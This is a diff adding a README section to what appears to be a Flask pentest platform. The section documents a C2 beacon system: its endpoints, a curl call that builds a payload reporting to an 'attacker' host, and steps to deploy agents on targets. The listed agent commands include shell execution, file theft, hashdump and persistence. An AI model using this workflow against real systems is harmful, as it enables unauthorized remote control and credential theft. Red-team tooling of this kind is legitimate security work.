@@ -55,6 +55,73 @@ analyst:analyst123
 
 ---
 
+## 🔴 C2 Listener & Beacon Support
+
+Real Mythic/Sliver-style beacon management system for persistent agent control.
+
+### Features
+- **Real Beacon Protocol**: HTTP check-in → task queue → result collection
+- **Multi-language Agents**: Python, PowerShell, Bash, PHP
+- **Encrypted Communications**: Fernet AES-256 encryption (optional)
+- **Task Management**: Queue commands, collect output, store loot
+- **Live Status Tracking**: Active/Dormant/Dead beacon states
+
+### Beacon API Endpoints
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/c2/beacon/checkin` | POST | Agent check-in & task retrieval |
+| `/c2/beacon/result/<id>` | POST | Submit task results |
+| `/c2/beacons` | GET | List all beacons |
+| `/c2/beacons/<id>/task` | POST | Queue task for beacon |
+| `/c2/beacons/<id>/kill` | POST | Terminate beacon |
+| `/c2/payloads/generate` | POST | Generate agent payload |
+| `/c2/payloads/types` | GET | List payload types |
+| `/c2/stats` | GET | C2 statistics |
+| `/c2/loot` | GET | Harvested credentials |
+
+### Quick Start - Deploy Agent
+
+1. Generate payload from UI (`/c2`) or API:
+```bash
+curl -X POST http://localhost:8080/c2/payloads/generate \
+  -H "Content-Type: application/json" \
+  -d '{"type":"python","c2_url":"http://attacker:8080/c2/beacon","options":{"sleep":30}}'
+```
+
+2. Deploy agent on target:
+```bash
+python3 beacon.py
+```
+
+3. Interact via UI or API:
+```bash
+# Queue shell command
+curl -X POST http://localhost:8080/c2/beacons/BEACON_ID/task \
+  -H "Content-Type: application/json" \
+  -d '{"command":"shell","args":["whoami"]}'
+```
+
+### Available Payload Types
+- `python` - Full Python beacon agent
+- `python_oneliner` - Compressed base64 one-liner
+- `powershell` - PowerShell beacon script
+- `powershell_encoded` - Base64 encoded PS command
+- `bash` - Bash/Shell beacon
+- `php` - PHP beacon/webshell hybrid
+
+### Agent Commands
+- `shell <cmd>` - Execute shell command
+- `download <path>` - Download file from target
+- `upload <path> <data>` - Upload file to target
+- `hashdump` - Dump password hashes
+- `ps` - List processes
+- `sleep <seconds>` - Change sleep interval
+- `persist` - Install persistence mechanism
+- `exit` - Terminate agent
+
+---
+
 ![Coverage Target](https://img.shields.io/badge/coverage%20target-50%25-yellow)
 
 Modular Flask-based pentest platform with services, routes, templates, and worker queue support.
